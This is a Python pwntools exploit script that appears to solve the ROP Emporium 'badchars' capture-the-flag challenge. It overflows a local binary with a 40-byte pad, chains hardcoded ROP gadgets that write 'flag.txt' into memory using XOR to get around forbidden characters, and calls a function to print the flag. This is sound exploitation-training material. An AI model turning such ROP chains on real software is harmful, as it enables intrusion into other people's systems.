import sys
from pwn import *

context.arch = "amd64"

badchars = [b"x", b"g", b"a", b"."]

def fix_chars(chars, addr_write):
    addrs = {}
    target_addr = addr_write
    chars = list(chars)

    i = 0
    for char in chars:
        if char == "a":
            addrs[p64(target_addr + i)] = p64(0x0000000000000003)
            chars[i] = chr(ord(char) + 1)
        elif char == "g":
            addrs[p64(target_addr + i)] = p64(0x000000000000000f)
            chars[i] = chr(ord(char) + 1)
        elif char == ".":
            addrs[p64(target_addr + i)] = p64(0x0000000000000001)
            chars[i] = chr(ord(char) + 1)
        elif char == "x":
            addrs[p64(target_addr + i)] = p64(0x0000000000000001)
            chars[i] = chr(ord(char) + 1)


        i = i + 1

    chars = ''.join(chars)
    chars = str.encode(chars)
    addr_write = p64(addr_write)

    return addr_write, chars, addrs

def process_xors(addrs):
    payload = b''
    i = 0
    for addr in addrs:
        if i == 0:
            payload += pop_0
            payload += data_0 + addr_write + addrs[addr] + addr

            payload += mov_0

            payload += xor_0
        else:
            payload += pop_0
            payload += data_0 + addr_write + addrs[addr] + addr

            payload += xor_0

        i = i + 1


    return payload


# .data section (16 bytes)
addr_write = 0x0000000000601038
# 0x0000000000400634: mov qword ptr [r13], r12; ret;
mov_0 = p64(0x0000000000400634)
# 0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;
pop_0 = p64(0x000000000040069c)
# 0x00000000004006a3: pop rdi; ret;
pop_1 = p64(0x00000000004006a3)
# 0x0000000000400628: xor byte ptr [r15], r14b; ret;
xor_0 = p64(0x0000000000400628)
# usefulFunction()
func_usefulFunction = p64(0x0000000000400620)

data_0 = "flag.txt"

addr_write, data_0, addrs = fix_chars(data_0, addr_write)

payload = b'a'*40

payload += process_xors(addrs)

payload += pop_1
payload += addr_write

payload += func_usefulFunction

print(payload)
with open("payload.txt", "wb+") as f:
    f.write(payload)

if len(sys.argv) == 2:
    if str(sys.argv[1]) == "-g":
        log.warn("Entering debug mode")
        prog = gdb.debug("./badchars", '''
            unset env
            break *0x0000000000400690
            break *0x0000000000400628
            break *0x0000000000400693
            break *0x0000000000400617
            break *0x00000000004004e6
        ''')
    else:
        log.critical("Please use '-g' if you would like to debug")
        exit(-1)
else:
    prog = process("./badchars")

output = prog.recvuntil(b">")
print(output.decode("utf-8"))

prog.sendline(payload)

output = prog.recvuntil(b"}")
print(output.decode("utf-8"))

prog.clean()
